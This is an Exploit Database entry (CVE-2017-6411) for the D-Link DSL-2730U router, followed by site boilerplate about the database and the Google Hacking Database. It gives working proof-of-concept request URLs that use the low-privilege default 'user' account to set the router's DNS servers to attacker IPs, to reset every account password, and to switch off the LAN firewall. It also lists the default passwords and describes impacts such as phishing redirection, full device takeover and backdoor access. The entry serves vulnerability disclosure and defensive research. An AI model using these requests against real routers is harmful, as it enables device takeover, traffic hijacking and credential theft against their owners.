Author		: 	B GOVIND
Exploit Title	: 	DLink DSL-2730U Wireless N 150, Change DNS Configuration  bypassing ‘admin’ privilege
Date		: 	01-03-2017
Vendor Homepage	: http://www.dlink.co.in
Firmware Link	: ftp://support.dlink.co.in/firmware/DSL-2730U
Affected version	:  Hardware ver C1, Firmware ver: IN_1.0.0
Email id	: govindnair7102@gmail.com
CVE		:  CVE-2017-6411

Change DNS Configuration Bypassing ‘admin’ Privilege
-------------------------------------------------------

D-Link DSL-2730U wireless router is a very popular SOHO network device used in India. This device has three default accounts ‘admin’, ‘support’ and ‘user’. As per D-Link only “admin" account has unrestricted access to change configuration of device. Account name ‘user’ can just view configuration settings and statistics.

1.	Description of Vulnerability

Cross Site Request Forgery can be used to manipulate dnscfg.cgi in this device. An insider / external attacker (remote management to be enabled for external attacker) can change primary and secondary DNS IP address to some malicious IP address without using ‘admin’ account.

2.	Proof of Concept

Use following URL to modify the DNS entries:

	http://user:user@192.168.1.1/dnscfg.cgi?dnsPrimary=x.x.x.x&dnsSecondary=y.y.y.y&dnsIfcsList=&dnsRefresh=1

	Here x.x.x.x and y.y.y.y are the malicious IP address attacker can use.

3.	Impact of vulnerability

Information Disclosure:  An attacker exploiting this vulnerability can obtain confidential information like users browsing profile. Modifying device DNS settings allows cybercriminals to perform malicious activities like the following:

(a)	 Redirect user traffic to malicious/fake sites. These sites can be phishing pages that spoofs well-known sites and tricks users into submit sensitive user credentials like banks account username and password.

(b)	This can ensure that no more patches are updated from OS vendor sites or firewall sites.

(c)	Replace ads on legitimate sites and serve users with unwanted/fake ads.

(d)	Pushing malwares.

4.	Solution

As per D-Link India this is the only no updated firmware is available for this hardware version which can mitigate this vulnerability which avoids privilege escalation.
All users of this hardware should change default passwords of not just ‘admin’ account but also ‘user’ and ‘support’

Change All Account Password Bypassing ‘admin’ Privilege
----------------------------------------------------------

    D-Link DSL-2730U wireless router is a very popular SOHO network device used in India. This device has three default accounts ‘admin’, ‘support’ and ‘user’. As per D-Link only “admin" account has unrestricted access to change configuration of device. Account name ‘user’ can just view configuration settings and statistics. Default password of admin, support and user account are admin, support and user respectively.

1.  Description of Vulnerability

    Cross Site Request Forgery can be used to manipulate password.cgi in this device. An insider / external attacker (remote management to be enabled for external attacker) can change password of all the three accounts without using ‘admin’ account.

2.  Proof of Concept

This exploit works only when accounts are using default password.

Use following URL to change  ‘admin’ account password from ‘admin’ to
‘admin1’.

    http://user:user@192.168.1.1/password.cgi?
inUserName=admin&inPassword=ZGFyZWFkbWluMQ==&inOrgPassword=ZGFyZWFkbWlu

(b) Use following URL to change ‘support’ account password from ‘support’ to
‘support1’.

http://user:user@192.168.1.1/password.cgi?
inUserName=support&inPassword=ZGFyZXN1cHBvcnQx&inOrgPassword=ZGFyZXN1cHBvcnQ=

(c) Use following URL to change ‘user’ account password from ‘user’ to
‘user1’.

http://user:user@192.168.1.1/password.cgi?
inUserName=user&inPassword=ZGFyZXVzZXIx&inOrgPassword=ZGFyZXVzZXI=

Here ‘inPassword’ is the new password and ‘inOrgPassword’ is the existing password. Both these password strings are base64 encoded for confidentiality as connection between browser and web server is using http.

3.  Impact of vulnerability

Elevation of privilege, Information Disclosure, Denial Of service

(a) Insider/Attacker can change the passwords of all the existing accounts and control the device as required. This will result in attacker having complete control over the device. He can capture traffic of other user and analyse traffic. Attacker can deny services as per his/her choice.

4.  Solution

    As per D-Link India this is the only no updated firmware available for this hardware version which can mitigate this vulnerability. All users of this hardware should change default passwords of all the default accounts.

Enable/Disable LAN side Firewall without admin privilege
---------------------------------------------------------

	D-Link DSL-2730U wireless router is a very popular SOHO network device used in India. This device has three default accounts ‘admin’, ‘support’ and ‘user’. As per D-Link only “admin" account has unrestricted access to change configuration of device. Account name ‘user’ can just view configuration settings and statistics. Default password of admin, support and user account are admin, support and user respectively.

1.	Description of Vulnerability

	Cross Site Request Forgery can be used to manipulate lancfg2.cgi in this device. An insider / external attacker (remote management to be enabled for external attacker) can enable/disable LAN side firewall without ‘admin’ privilege using ‘user ‘ account.

2.	Proof of Concept

   Use following URL to enable LAN side firewall

	http://user:user@192.168.1.1/lancfg2.cgi?ethIpAddress=192.168.1.1&eth SubnetMask=255.255.255.0&enblLanFirewall=1&enblIgmpSnp=0&enblIgmpMode=0&dhcpEthStart=192.168.1.2&dhcpEthEnd=192.168.1.254&dhcpLeasedTime=86400&enblDhcpSrv=1&enblLan2=0&enblLanDns=0

Use following URL to disable LAN side firewall

http://user:user@192.168.1.1/lancfg2.cgi?ethIpAddress=192.168.1.1&ethSubnetMask=255.255.255.0&enblLanFirewall=0&enblIgmpSnp=0&enblIgmpMode=0&dhcpEthStart=192.168.1.2&dhcpEthEnd=192.168.1.254&dhcpLeasedTime=86400&enblDhcpSrv=1&enblLan2=0&enblLanDns=0

3.	Impact of vulnerability

By disabling LAN side firewall and by enabling Port Triggering, an attacker can ensure a backdoor access within LAN side as well as from WAN side.
Attacker can run port scanning tools to map services which otherwise wont be possible with firewall enabled.

4.	Solution

	As per D-Link India this is the only no updated firmware available for this hardware version which can mitigate this vulnerability. All users of this hardware should change default passwords of all the default accounts.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
